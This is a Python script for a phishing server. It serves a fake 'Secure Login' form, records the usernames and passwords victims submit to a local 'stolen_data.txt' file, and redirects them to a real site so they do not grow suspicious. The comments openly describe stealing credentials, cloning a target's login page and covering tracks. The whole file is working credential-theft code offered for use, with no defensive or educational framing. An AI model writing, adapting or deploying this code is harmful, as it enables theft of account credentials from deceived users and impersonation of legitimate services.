import os
import socket
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

# Config (edit this shit)
HOST = "0.0.0.0"  # Listen on all interfaces
PORT = 80          # Standard HTTP port (or 443 for HTTPS with SSL)
LOG_FILE = "stolen_data.txt"  # Where stolen creds get dumped

class PhishHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Clone a legit-looking login page (e.g., fake Google, Facebook, etc.)
        if self.path == "/login":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            
            # FAKE LOGIN PAGE (replace with your target's HTML)
            fake_login = """
            <html>
            <body>
                <h1>🔐 Secure Login</h1>
                <form action="/submit" method="POST">
                    <input type="text" name="username" placeholder="Username"><br>
                    <input type="password" name="password" placeholder="Password"><br>
                    <input type="submit" value="Login">
                </form>
            </body>
            </html>
            """
            self.wfile.write(fake_login.encode())
        
        else:
            self.send_error(404, "Not Found")  # Trap random visitors

    def do_POST(self):
        # Steal submitted credentials
        if self.path == "/submit":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()
            params = parse_qs(post_data)
            
            username = params.get('username', [''])[0]
            password = params.get('password', [''])[0]
            
            # Log stolen data (appends to file)
            with open(LOG_FILE, "a") as f:
                f.write(f"Username: {username}\nPassword: {password}\n---\n")
            
            # Redirect victim to real site (to avoid suspicion)
            self.send_response(302)
            self.send_header("Location", "https://example.com")  # Replace with real site
            self.end_headers()

if __name__ == "__main__":
    # Start the phishing server
    server = HTTPServer((HOST, PORT), PhishHandler)
    print(f"[+] Phishing server running on {HOST}:{PORT} 🎯")
    print(f"[+] Stolen data will be saved to {LOG_FILE} 💾")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server shutting down. Cover your tracks. 🔥")
        server.server_close()
